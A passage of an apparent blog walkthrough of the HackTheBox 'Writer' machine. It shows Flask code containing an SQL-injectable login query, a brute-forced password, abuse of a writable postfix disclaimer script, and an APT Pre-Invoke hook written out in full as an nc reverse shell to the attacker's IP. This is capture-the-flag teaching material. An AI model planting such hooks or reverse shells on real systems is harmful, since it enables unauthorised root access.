                    <span class="k">return</span> <span class="n">render_template</span><span class="p">(</span><span class="s">'edit.html'</span><span class="p">,</span> <span class="n">error</span><span class="o">=</span><span class="n">error</span><span class="p">,</span> <span class="n">results</span><span class="o">=</span><span class="n">results</span><span class="p">,</span> <span class="nb">id</span><span class="o">=</span><span class="nb">id</span><span class="p">)</span>
            <span class="k">else</span><span class="p">:</span>
                <span class="n">error</span> <span class="o">=</span> <span class="s">"File extensions must be in .jpg!"</span>
                <span class="k">return</span> <span class="n">render_template</span><span class="p">(</span><span class="s">'edit.html'</span><span class="p">,</span> <span class="n">error</span><span class="o">=</span><span class="n">error</span><span class="p">,</span> <span class="n">results</span><span class="o">=</span><span class="n">results</span><span class="p">,</span> <span class="nb">id</span><span class="o">=</span><span class="nb">id</span><span class="p">)</span>
        <span class="n">title</span> <span class="o">=</span> <span class="n">request</span><span class="p">.</span><span class="n">form</span><span class="p">.</span><span class="n">get</span><span class="p">(</span><span class="s">'title'</span><span class="p">)</span>
        <span class="n">tagline</span> <span class="o">=</span> <span class="n">request</span><span class="p">.</span><span class="n">form</span><span class="p">.</span><span class="n">get</span><span class="p">(</span><span class="s">'tagline'</span><span class="p">)</span>
        <span class="n">content</span> <span class="o">=</span> <span class="n">request</span><span class="p">.</span><span class="n">form</span><span class="p">.</span><span class="n">get</span><span class="p">(</span><span class="s">'content'</span><span class="p">)</span>
        <span class="n">cursor</span> <span class="o">=</span> <span class="n">connector</span><span class="p">.</span><span class="n">cursor</span><span class="p">()</span>
        <span class="n">cursor</span><span class="p">.</span><span class="n">execute</span><span class="p">(</span><span class="s">"UPDATE stories SET title = %(title)s, tagline = %(tagline)s, content = %(content)s WHERE id = %(id)s"</span><span class="p">,</span> <span class="p">{</span><span class="s">'title'</span><span class="p">:</span><span class="n">title</span><span class="p">,</span> <span class="s">'tagline'</span><span class="p">:</span><span class="n">tagline</span><span class="p">,</span> <span class="s">'content'</span><span class="p">:</span><span class="n">content</span><span class="p">,</span> <span class="s">'id'</span><span class="p">:</span> <span class="nb">id</span><span class="p">})</span>
        <span class="n">result</span> <span class="o">=</span> <span class="n">connector</span><span class="p">.</span><span class="n">commit</span><span class="p">()</span>
        <span class="k">return</span> <span class="n">redirect</span><span class="p">(</span><span class="s">'/dashboard/stories'</span><span class="p">)</span>

    <span class="k">else</span><span class="p">:</span>
        <span class="n">cursor</span> <span class="o">=</span> <span class="n">connector</span><span class="p">.</span><span class="n">cursor</span><span class="p">()</span>
        <span class="n">cursor</span><span class="p">.</span><span class="n">execute</span><span class="p">(</span><span class="s">"SELECT * FROM stories where id = %(id)s;"</span><span class="p">,</span> <span class="p">{</span><span class="s">'id'</span><span class="p">:</span> <span class="nb">id</span><span class="p">})</span>
        <span class="n">results</span> <span class="o">=</span> <span class="n">cursor</span><span class="p">.</span><span class="n">fetchall</span><span class="p">()</span>
        <span class="k">return</span> <span class="n">render_template</span><span class="p">(</span><span class="s">'edit.html'</span><span class="p">,</span> <span class="n">results</span><span class="o">=</span><span class="n">results</span><span class="p">,</span> <span class="nb">id</span><span class="o">=</span><span class="nb">id</span><span class="p">)</span>

<span class="o">@</span><span class="n">app</span><span class="p">.</span><span class="n">route</span><span class="p">(</span><span class="s">'/dashboard/stories/delete/&lt;id&gt;'</span><span class="p">,</span> <span class="n">methods</span><span class="o">=</span><span class="p">[</span><span class="s">'GET'</span><span class="p">,</span> <span class="s">'POST'</span><span class="p">])</span>
<span class="k">def</span> <span class="nf">delete_story</span><span class="p">(</span><span class="nb">id</span><span class="p">):</span>
    <span class="k">if</span> <span class="ow">not</span> <span class="p">(</span><span class="s">'user'</span> <span class="ow">in</span> <span class="n">session</span><span class="p">):</span>
        <span class="k">return</span> <span class="n">redirect</span><span class="p">(</span><span class="s">'/'</span><span class="p">)</span>
    <span class="k">try</span><span class="p">:</span>
        <span class="n">connector</span> <span class="o">=</span> <span class="n">connections</span><span class="p">()</span>
    <span class="k">except</span> <span class="n">mysql</span><span class="p">.</span><span class="n">connector</span><span class="p">.</span><span class="n">Error</span> <span class="k">as</span> <span class="n">err</span><span class="p">:</span>
            <span class="k">return</span> <span class="p">(</span><span class="s">"Database error"</span><span class="p">)</span>
    <span class="k">if</span> <span class="n">request</span><span class="p">.</span><span class="n">method</span> <span class="o">==</span> <span class="s">"POST"</span><span class="p">:</span>
        <span class="n">cursor</span> <span class="o">=</span> <span class="n">connector</span><span class="p">.</span><span class="n">cursor</span><span class="p">()</span>
        <span class="n">cursor</span><span class="p">.</span><span class="n">execute</span><span class="p">(</span><span class="s">"DELETE FROM stories WHERE id = %(id)s;"</span><span class="p">,</span> <span class="p">{</span><span class="s">'id'</span><span class="p">:</span> <span class="nb">id</span><span class="p">})</span>
        <span class="n">result</span> <span class="o">=</span> <span class="n">connector</span><span class="p">.</span><span class="n">commit</span><span class="p">()</span>
        <span class="k">return</span> <span class="n">redirect</span><span class="p">(</span><span class="s">'/dashboard/stories'</span><span class="p">)</span>
    <span class="k">else</span><span class="p">:</span>
        <span class="n">cursor</span> <span class="o">=</span> <span class="n">connector</span><span class="p">.</span><span class="n">cursor</span><span class="p">()</span>
        <span class="n">cursor</span><span class="p">.</span><span class="n">execute</span><span class="p">(</span><span class="s">"SELECT * FROM stories where id = %(id)s;"</span><span class="p">,</span> <span class="p">{</span><span class="s">'id'</span><span class="p">:</span> <span class="nb">id</span><span class="p">})</span>
        <span class="n">results</span> <span class="o">=</span> <span class="n">cursor</span><span class="p">.</span><span class="n">fetchall</span><span class="p">()</span>
        <span class="k">return</span> <span class="n">render_template</span><span class="p">(</span><span class="s">'delete.html'</span><span class="p">,</span> <span class="n">results</span><span class="o">=</span><span class="n">results</span><span class="p">,</span> <span class="nb">id</span><span class="o">=</span><span class="nb">id</span><span class="p">)</span>

<span class="c1">#Define user page for dashboard
</span><span class="o">@</span><span class="n">app</span><span class="p">.</span><span class="n">route</span><span class="p">(</span><span class="s">'/dashboard/users'</span><span class="p">)</span>
<span class="k">def</span> <span class="nf">users</span><span class="p">():</span>
    <span class="k">if</span> <span class="ow">not</span> <span class="p">(</span><span class="s">'user'</span> <span class="ow">in</span> <span class="n">session</span><span class="p">):</span>
        <span class="k">return</span> <span class="n">redirect</span><span class="p">(</span><span class="s">'/'</span><span class="p">)</span>
    <span class="k">try</span><span class="p">:</span>
        <span class="n">connector</span> <span class="o">=</span> <span class="n">connections</span><span class="p">()</span>
    <span class="k">except</span> <span class="n">mysql</span><span class="p">.</span><span class="n">connector</span><span class="p">.</span><span class="n">Error</span> <span class="k">as</span> <span class="n">err</span><span class="p">:</span>
        <span class="k">return</span> <span class="s">"Database Error"</span>
    <span class="n">cursor</span> <span class="o">=</span> <span class="n">connector</span><span class="p">.</span><span class="n">cursor</span><span class="p">()</span>
    <span class="n">sql_command</span> <span class="o">=</span> <span class="s">"SELECT * FROM users;"</span>
    <span class="n">cursor</span><span class="p">.</span><span class="n">execute</span><span class="p">(</span><span class="n">sql_command</span><span class="p">)</span>
    <span class="n">results</span> <span class="o">=</span> <span class="n">cursor</span><span class="p">.</span><span class="n">fetchall</span><span class="p">()</span>
    <span class="k">return</span> <span class="n">render_template</span><span class="p">(</span><span class="s">'users.html'</span><span class="p">,</span> <span class="n">results</span><span class="o">=</span><span class="n">results</span><span class="p">)</span>

<span class="c1">#Define settings page
</span><span class="o">@</span><span class="n">app</span><span class="p">.</span><span class="n">route</span><span class="p">(</span><span class="s">'/dashboard/settings'</span><span class="p">,</span> <span class="n">methods</span><span class="o">=</span><span class="p">[</span><span class="s">'GET'</span><span class="p">])</span>
<span class="k">def</span> <span class="nf">settings</span><span class="p">():</span>
    <span class="k">if</span> <span class="ow">not</span> <span class="p">(</span><span class="s">'user'</span> <span class="ow">in</span> <span class="n">session</span><span class="p">):</span>
        <span class="k">return</span> <span class="n">redirect</span><span class="p">(</span><span class="s">'/'</span><span class="p">)</span>
    <span class="k">try</span><span class="p">:</span>
        <span class="n">connector</span> <span class="o">=</span> <span class="n">connections</span><span class="p">()</span>
    <span class="k">except</span> <span class="n">mysql</span><span class="p">.</span><span class="n">connector</span><span class="p">.</span><span class="n">Error</span> <span class="k">as</span> <span class="n">err</span><span class="p">:</span>
        <span class="k">return</span> <span class="s">"Database Error!"</span>
    <span class="n">cursor</span> <span class="o">=</span> <span class="n">connector</span><span class="p">.</span><span class="n">cursor</span><span class="p">()</span>
    <span class="n">sql_command</span> <span class="o">=</span> <span class="s">"SELECT * FROM site WHERE id = 1"</span>
    <span class="n">cursor</span><span class="p">.</span><span class="n">execute</span><span class="p">(</span><span class="n">sql_command</span><span class="p">)</span>
    <span class="n">results</span> <span class="o">=</span> <span class="n">cursor</span><span class="p">.</span><span class="n">fetchall</span><span class="p">()</span>
    <span class="k">return</span> <span class="n">render_template</span><span class="p">(</span><span class="s">'settings.html'</span><span class="p">,</span> <span class="n">results</span><span class="o">=</span><span class="n">results</span><span class="p">)</span>

<span class="c1">#Define authentication mechanism
</span><span class="o">@</span><span class="n">app</span><span class="p">.</span><span class="n">route</span><span class="p">(</span><span class="s">'/administrative'</span><span class="p">,</span> <span class="n">methods</span><span class="o">=</span><span class="p">[</span><span class="s">'POST'</span><span class="p">,</span> <span class="s">'GET'</span><span class="p">])</span>
<span class="k">def</span> <span class="nf">login_page</span><span class="p">():</span>
    <span class="k">if</span> <span class="p">(</span><span class="s">'user'</span> <span class="ow">in</span> <span class="n">session</span><span class="p">):</span>
        <span class="k">return</span> <span class="n">redirect</span><span class="p">(</span><span class="s">'/dashboard'</span><span class="p">)</span>
    <span class="k">if</span> <span class="n">request</span><span class="p">.</span><span class="n">method</span> <span class="o">==</span> <span class="s">"POST"</span><span class="p">:</span>
        <span class="n">username</span> <span class="o">=</span> <span class="n">request</span><span class="p">.</span><span class="n">form</span><span class="p">.</span><span class="n">get</span><span class="p">(</span><span class="s">'uname'</span><span class="p">)</span>
        <span class="n">password</span> <span class="o">=</span> <span class="n">request</span><span class="p">.</span><span class="n">form</span><span class="p">.</span><span class="n">get</span><span class="p">(</span><span class="s">'password'</span><span class="p">)</span>
        <span class="n">password</span> <span class="o">=</span> <span class="n">hashlib</span><span class="p">.</span><span class="n">md5</span><span class="p">(</span><span class="n">password</span><span class="p">.</span><span class="n">encode</span><span class="p">(</span><span class="s">'utf-8'</span><span class="p">)).</span><span class="n">hexdigest</span><span class="p">()</span>
        <span class="k">try</span><span class="p">:</span>
            <span class="n">connector</span> <span class="o">=</span> <span class="n">connections</span><span class="p">()</span>
        <span class="k">except</span> <span class="n">mysql</span><span class="p">.</span><span class="n">connector</span><span class="p">.</span><span class="n">Error</span> <span class="k">as</span> <span class="n">err</span><span class="p">:</span>
            <span class="k">return</span> <span class="p">(</span><span class="s">"Database error"</span><span class="p">)</span>
        <span class="k">try</span><span class="p">:</span>
            <span class="n">cursor</span> <span class="o">=</span> <span class="n">connector</span><span class="p">.</span><span class="n">cursor</span><span class="p">()</span>
            <span class="n">sql_command</span> <span class="o">=</span> <span class="s">"Select * From users Where username = '%s' And password = '%s'"</span> <span class="o">%</span> <span class="p">(</span><span class="n">username</span><span class="p">,</span> <span class="n">password</span><span class="p">)</span>
            <span class="n">cursor</span><span class="p">.</span><span class="n">execute</span><span class="p">(</span><span class="n">sql_command</span><span class="p">)</span>
            <span class="n">results</span> <span class="o">=</span> <span class="n">cursor</span><span class="p">.</span><span class="n">fetchall</span><span class="p">()</span>
            <span class="k">for</span> <span class="n">result</span> <span class="ow">in</span> <span class="n">results</span><span class="p">:</span>
                <span class="k">print</span><span class="p">(</span><span class="s">"Got result"</span><span class="p">)</span>
            <span class="k">if</span> <span class="n">result</span> <span class="ow">and</span> <span class="nb">len</span><span class="p">(</span><span class="n">result</span><span class="p">)</span> <span class="o">!=</span> <span class="mi">0</span><span class="p">:</span>
                <span class="n">session</span><span class="p">[</span><span class="s">'user'</span><span class="p">]</span> <span class="o">=</span> <span class="n">username</span>
                <span class="k">return</span> <span class="n">render_template</span><span class="p">(</span><span class="s">'success.html'</span><span class="p">,</span> <span class="n">results</span><span class="o">=</span><span class="n">results</span><span class="p">)</span>
            <span class="k">else</span><span class="p">:</span>
                <span class="n">error</span> <span class="o">=</span> <span class="s">"Incorrect credentials supplied"</span>
                <span class="k">return</span> <span class="n">render_template</span><span class="p">(</span><span class="s">'login.html'</span><span class="p">,</span> <span class="n">error</span><span class="o">=</span><span class="n">error</span><span class="p">)</span>
        <span class="k">except</span><span class="p">:</span>
            <span class="n">error</span> <span class="o">=</span> <span class="s">"Incorrect credentials supplied"</span>
            <span class="k">return</span> <span class="n">render_template</span><span class="p">(</span><span class="s">'login.html'</span><span class="p">,</span> <span class="n">error</span><span class="o">=</span><span class="n">error</span><span class="p">)</span>
    <span class="k">else</span><span class="p">:</span>
        <span class="k">return</span> <span class="n">render_template</span><span class="p">(</span><span class="s">'login.html'</span><span class="p">)</span>

<span class="o">@</span><span class="n">app</span><span class="p">.</span><span class="n">route</span><span class="p">(</span><span class="s">"/logout"</span><span class="p">)</span>
<span class="k">def</span> <span class="nf">logout</span><span class="p">():</span>
    <span class="k">if</span> <span class="ow">not</span> <span class="p">(</span><span class="s">'user'</span> <span class="ow">in</span> <span class="n">session</span><span class="p">):</span>
        <span class="k">return</span> <span class="n">redirect</span><span class="p">(</span><span class="s">'/'</span><span class="p">)</span>
    <span class="n">session</span><span class="p">.</span><span class="n">pop</span><span class="p">(</span><span class="s">'user'</span><span class="p">)</span>
    <span class="k">return</span> <span class="n">redirect</span><span class="p">(</span><span class="s">'/'</span><span class="p">)</span>

<span class="k">if</span> <span class="n">__name__</span> <span class="o">==</span> <span class="s">'__main__'</span><span class="p">:</span>
   <span class="n">app</span><span class="p">.</span><span class="n">run</span><span class="p">(</span><span class="s">"0.0.0.0"</span><span class="p">)</span>
</pre></td></tr></tbody></table></code></div></div>

<p>Tried to exploit the python code. But nothing worked for me.</p>

<p>Password : <code class="language-plaintext highlighter-rouge">ToughPasswordToCrack</code>
We have two users, I tried to see if the user used same password. But nope. Looks like the password is different.</p>

<h3 id="foothold">FootHold</h3>

<p>Let’s brute force for password for both the users.</p>

<p><img data-proofer-ignore data-src="/assets/images/Pasted image 20210803112715.png" alt="[Pasted image 20210803112715.png]" /></p>

<p>We have kyle user password</p>

<p>username : <code class="language-plaintext highlighter-rouge">kyle</code>
password : <code class="language-plaintext highlighter-rouge">marcoantonio</code></p>

<p><img data-proofer-ignore data-src="/assets/images/Pasted image 20210803113121.png" alt="[Pasted image 20210803113121.png]" /></p>

<p><img data-proofer-ignore data-src="/assets/images/Pasted image 20210803112950.png" alt="[Pasted image 20210803112950.png]" /></p>

<p>Got our user flag.</p>

<h3 id="user-escalation">User Escalation</h3>

<p>Now we need to privelege escalation to ROOT.</p>

<p>We have a disclaimer executable file in the home directory of kyle</p>

<div lang="bash" class="language-bash highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
34
35
36
37
</pre></td><td class="rouge-code"><pre>kyle@writer:~<span class="nv">$ </span><span class="nb">cat </span>disclaimer 
<span class="c">#!/bin/sh</span>
<span class="c"># Localize these.</span>
<span class="nv">INSPECT_DIR</span><span class="o">=</span>/var/spool/filter
<span class="nv">SENDMAIL</span><span class="o">=</span>/usr/sbin/sendmail

<span class="c"># Get disclaimer addresses</span>
<span class="nv">DISCLAIMER_ADDRESSES</span><span class="o">=</span>/etc/postfix/disclaimer_addresses

<span class="c"># Exit codes from &lt;sysexits.h&gt;</span>
<span class="nv">EX_TEMPFAIL</span><span class="o">=</span>75
<span class="nv">EX_UNAVAILABLE</span><span class="o">=</span>69

<span class="c"># Clean up when done or when aborting.</span>
<span class="nb">trap</span> <span class="s2">"rm -f in.</span><span class="nv">$$</span><span class="s2">"</span> 0 1 2 3 15

<span class="c"># Start processing.</span>
<span class="nb">cd</span> <span class="nv">$INSPECT_DIR</span> <span class="o">||</span> <span class="o">{</span> <span class="nb">echo</span> <span class="nv">$INSPECT_DIR</span> does not exist<span class="p">;</span> <span class="nb">exit</span>
<span class="nv">$EX_TEMPFAIL</span><span class="p">;</span> <span class="o">}</span>

<span class="nb">cat</span> <span class="o">&gt;</span><span class="k">in</span>.<span class="nv">$$</span> <span class="o">||</span> <span class="o">{</span> <span class="nb">echo </span>Cannot save mail to file<span class="p">;</span> <span class="nb">exit</span> <span class="nv">$EX_TEMPFAIL</span><span class="p">;</span> <span class="o">}</span>

<span class="c"># obtain From address</span>
<span class="nv">from_address</span><span class="o">=</span><span class="sb">`</span><span class="nb">grep</span> <span class="nt">-m</span> 1 <span class="s2">"From:"</span> <span class="k">in</span>.<span class="nv">$$</span> | <span class="nb">cut</span> <span class="nt">-d</span> <span class="s2">"&lt;"</span> <span class="nt">-f</span> 2 | <span class="nb">cut</span> <span class="nt">-d</span> <span class="s2">"&gt;"</span> <span class="nt">-f</span> 1<span class="sb">`</span>

<span class="k">if</span> <span class="o">[</span> <span class="sb">`</span><span class="nb">grep</span> <span class="nt">-wi</span> ^<span class="k">${</span><span class="nv">from_address</span><span class="k">}</span><span class="nv">$ </span><span class="k">${</span><span class="nv">DISCLAIMER_ADDRESSES</span><span class="k">}</span><span class="sb">`</span> <span class="o">]</span><span class="p">;</span> <span class="k">then</span>
  /usr/bin/altermime <span class="nt">--input</span><span class="o">=</span><span class="k">in</span>.<span class="nv">$$</span> <span class="se">\</span>
                   <span class="nt">--disclaimer</span><span class="o">=</span>/etc/postfix/disclaimer.txt <span class="se">\</span>
                   <span class="nt">--disclaimer-html</span><span class="o">=</span>/etc/postfix/disclaimer.txt <span class="se">\</span>
                   <span class="nt">--xheader</span><span class="o">=</span><span class="s2">"X-Copyrighted-Material: Please visit http://www.company.com/privacy.htm"</span> <span class="o">||</span> <span class="se">\</span>
                    <span class="o">{</span> <span class="nb">echo </span>Message content rejected<span class="p">;</span> <span class="nb">exit</span> <span class="nv">$EX_UNAVAILABLE</span><span class="p">;</span> <span class="o">}</span>
<span class="k">fi</span>

<span class="nv">$SENDMAIL</span> <span class="s2">"</span><span class="nv">$@</span><span class="s2">"</span> &lt;<span class="k">in</span>.<span class="nv">$$</span>

<span class="nb">exit</span> <span class="nv">$?</span>

</pre></td></tr></tbody></table></code></div></div>

<p>Tried some auto checks and auto exploits but none of them worked. After going through several hours of the task.</p>

<p>We have postfix running on the machine</p>

<p><img data-proofer-ignore data-src="/assets/images/Pasted image 20210803113403.png" alt="[Pasted image 20210803113403.png]" /></p>

<p><img data-proofer-ignore data-src="/assets/images/Pasted image 20210803113544.png" alt="[Pasted image 20210803113544.png]" /></p>

<p><img data-proofer-ignore data-src="/assets/images/Pasted image 20210803113650.png" alt="[Pasted image 20210803113650.png]" /></p>

<p>We can write to this file. But what does this file exactly do.</p>

<p>After doing some study, I found a book about postfix configuration</p>

<blockquote>
  <p>https://mdex-nn.ru/uploads/postfix-the-definitive-guide.pdf</p>
</blockquote>

<p>Snip from book
<img data-proofer-ignore data-src="/assets/images/Pasted image 20210803114803.png" alt="[Pasted image 20210803114803.png]" /></p>

<p>Now i understood the payload disclaimer get executed for autoattach of footer disaclaimer message.</p>

<div lang="bash" class="language-bash highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
</pre></td><td class="rouge-code"><pre>kyle@writer:~<span class="nv">$ </span><span class="nb">cat</span> /etc/postfix/disclaimer.txt

<span class="nt">--</span>
This email and any files transmitted with it are confidential and intended solely <span class="k">for </span>the use of the individual or entity to whom they are addressed.
If you have received this email <span class="k">in </span>error please notify the system manager. This message contains confidential information and is intended only <span class="k">for </span>the
individual named. If you are not the named addressee you should not disseminate, distribute or copy this e-mail. Please notify the sender immediately
by e-mail <span class="k">if </span>you have received this e-mail by mistake and delete this e-mail from your system. If you are not the intended recipient you are notified
that disclosing, copying, distributing or taking any action <span class="k">in </span>reliance on the contents of this information is strictly prohibited.

Writer.HTB
</pre></td></tr></tbody></table></code></div></div>

<p>Now we have control over the disclaimer as group id <code class="language-plaintext highlighter-rouge">filter</code> can edit it.</p>

<p>I have added my reverse shell payload into the disclaimner file.</p>

<p><img data-proofer-ignore data-src="/assets/images/Pasted image 20210803115247.png" alt="[Pasted image 20210803115247.png]" /></p>

<p>Now we have to trigger it. Let’s write a simple using telnet on smtp port</p>

<p><img data-proofer-ignore data-src="/assets/images/Pasted image 20210803115601.png" alt="[Pasted image 20210803115601.png]" /></p>

<p>We get our reverse shell as user john</p>

<p><img data-proofer-ignore data-src="/assets/images/Pasted image 20210803115621.png" alt="[Pasted image 20210803115621.png]" /></p>

<p>Let’s grab john rsa and login from new prompt
<img data-proofer-ignore data-src="/assets/images/Pasted image 20210803115734.png" alt="[Pasted image 20210803115734.png]" /></p>

<p><img data-proofer-ignore data-src="/assets/images/Pasted image 20210803115832.png" alt="[Pasted image 20210803115832.png]" /></p>

<h3 id="root-privelege-escalation">Root Privelege Escalation</h3>

<p>After logging into the machine, tried some priv esc techniques but none of them worked. So i brought my pspy64 tool which can tell what process is getting invoked everytime and change in events are recorded and shown in a nicer format.</p>

<p><img data-proofer-ignore data-src="/assets/images/Pasted image 20210803120220.png" alt="[Pasted image 20210803120220.png]" /></p>

<p>I see an <code class="language-plaintext highlighter-rouge">apt-get update</code> command running every few minutes. And I exactly know how to exploit it if we have permission to write to <code class="language-plaintext highlighter-rouge">/etc/apt/apt.conf.d</code> directory.</p>

<p><img data-proofer-ignore data-src="/assets/images/Pasted image 20210803120446.png" alt="[Pasted image 20210803120446.png]" /></p>

<p>john has a management group attached to him. Probably he is reponsible the machine for upgrades as administrator.</p>

<div lang="bash" class="language-bash highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre></td><td class="rouge-code"><pre><span class="nb">echo</span> <span class="s1">'apt::Update::Pre-Invoke {"rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&gt;&amp;1|nc 10.10.17.189 1234 &gt;/tmp/f"};'</span> <span class="o">&gt;</span> 00-PWNED
</pre></td></tr></tbody></table></code></div></div>

<p>Let me tell you how this exploit works, whenever <code class="language-plaintext highlighter-rouge">apt-get update</code> is triggered from a user (generally a sudo user or high priv user).  APT checks for the configuration if anything has to be checked before doing an upgrade. This check is necessary if you don’t want to update the server/machine in the production environment automatically.</p>

<blockquote>
  <p>https://www.hackingarticles.in/linux-for-pentester-apt-privilege-escalation/</p>
</blockquote>

<p><img data-proofer-ignore data-src="/assets/images/Pasted image 20210803121036.png" alt="[Pasted image 20210803121036.png]" /></p>

<p><img data-proofer-ignore data-src="/assets/images/Pasted image 20210803121449.png" alt="[Pasted image 20210803121449.png]" /></p>

<p>After writing our payload let’s just wait for the update to trigger, this will execute our payload and get us a reverse shell.</p>

<p>Let’s have a look at our process monitor</p>

<p><img data-proofer-ignore data-src="/assets/images/Pasted image 20210803122642.png" alt="[Pasted image 20210803122642.png]" /></p>

<p>Our payload is executed and we have a reverse shell as root</p>

<p><img data-proofer-ignore data-src="/assets/images/Pasted image 20210803122736.png" alt="[Pasted image 20210803122736.png]" /></p>

<p>And we are root on the machine.</p>

<h3 id="learning-is-never-ending-process">Learning is never ending process</h3>



      </div>

      <div class="post-tail-wrapper text-muted">

        <!-- categories -->
        

        <div class="post-meta mb-3">
          <i class="far fa-folder-open fa-fw mr-1"></i>
          
            <a href='/categories/hackthebox/'>hackthebox</a>,
            <a href='/categories/linux/'>linux</a>
        </div>
        

        <!-- tags -->
        
        <div class="post-tags">
          <i class="fa fa-tags fa-fw mr-1"></i>
          
          <a href="/tags/hackthebox/"
            class="post-tag no-text-decoration" >hackthebox</a>
          
          <a href="/tags/medium/"
            class="post-tag no-text-decoration" >medium</a>
          
          <a href="/tags/bruteforce/"
            class="post-tag no-text-decoration" >bruteforce</a>
          
          <a href="/tags/apt/"
            class="post-tag no-text-decoration" >apt</a>
          
          </div>
        

        <div class="post-tail-bottom
          d-flex justify-content-between align-items-center mt-3 pt-5 pb-2">
          <div class="license-wrapper">
          
            
            This post is licensed under 
            <a href="https://creativecommons.org/licenses/by/4.0/">
              CC BY 4.0
            </a>
             by the author.
          
          </div>

          <!--
 Post sharing snippet
-->

<div class="share-wrapper">
  <span class="share-label text-muted mr-1">Share</span>
  <span class="share-icons">
    
    

    
      
        <a href="https://twitter.com/intent/tweet?text=Writer HTB - tinyb0y&url=http://0.0.0.0:4000/posts/Writer/" data-toggle="tooltip" data-placement="top"
          title="Twitter" target="_blank" rel="noopener" aria-label="Twitter">
          <i class="fa-fw fab fa-twitter"></i>
        </a>
    
      
        <a href="https://www.facebook.com/sharer/sharer.php?title=Writer HTB - tinyb0y&u=http://0.0.0.0:4000/posts/Writer/" data-toggle="tooltip" data-placement="top"
          title="Facebook" target="_blank" rel="noopener" aria-label="Facebook">
          <i class="fa-fw fab fa-facebook-square"></i>
        </a>
    
      
        <a href="https://telegram.me/share?text=Writer HTB - tinyb0y&url=http://0.0.0.0:4000/posts/Writer/" data-toggle="tooltip" data-placement="top"
          title="Telegram" target="_blank" rel="noopener" aria-label="Telegram">
          <i class="fa-fw fab fa-telegram"></i>
        </a>
    

    <i class="fa-fw fas fa-link small" onclick="copyLink('', 'Link copied successfully!')"
        data-toggle="tooltip" data-placement="top"
        title="Copy link">
    </i>

  </span>
</div>


        </div><!-- .post-tail-bottom -->

      </div><!-- div.post-tail -->

    </div> <!-- .post -->


  </div> <!-- #post-wrapper -->

  

  

  <!--
  The Pannel on right side (Desktop views)
-->





<div id="panel-wrapper" class="col-xl-3 pl-2 text-muted topbar-down">

  <div class="access">

  














  

  















  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
      
        
        

  
    
    
    
    
  
    
    
    
    
      
        
        

  
    
    
    
    
  
    
    
    
    
      
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
      
        
        

  
    
    
    
    
  
    
    
    
    
      
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
      
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
      
        
        

  
    
    
    
    
  
    
    
    
    
      
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
      
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
      
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
      
        
        

  
    
    
    
    
  
    
    
    
    
      
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
      
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
      
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
      
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
      
        
        

  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
      
        
        

  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
      
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
